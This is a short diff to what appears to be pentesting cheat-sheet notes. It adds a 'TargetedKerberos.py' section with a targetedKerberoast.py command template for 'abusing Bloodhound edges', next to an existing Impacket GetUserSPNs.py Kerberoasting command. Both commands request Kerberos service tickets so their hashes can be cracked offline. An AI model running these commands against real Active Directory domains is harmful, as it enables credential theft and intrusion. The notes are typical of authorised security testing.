@@ -12,3 +12,9 @@ Specifically, the script:
 # Add domain to /etc/hosts so it resolves
 GetUserSPNs.py <domain>/<user>:<password> -request -save
 ```
+
+## TargetedKerberos.py
+Useful for abusing Bloodhound edges.
+```
+targetedKerberoast.py -v -d '<domain>' -u '<Owned USer>' -p '<password>'
+```
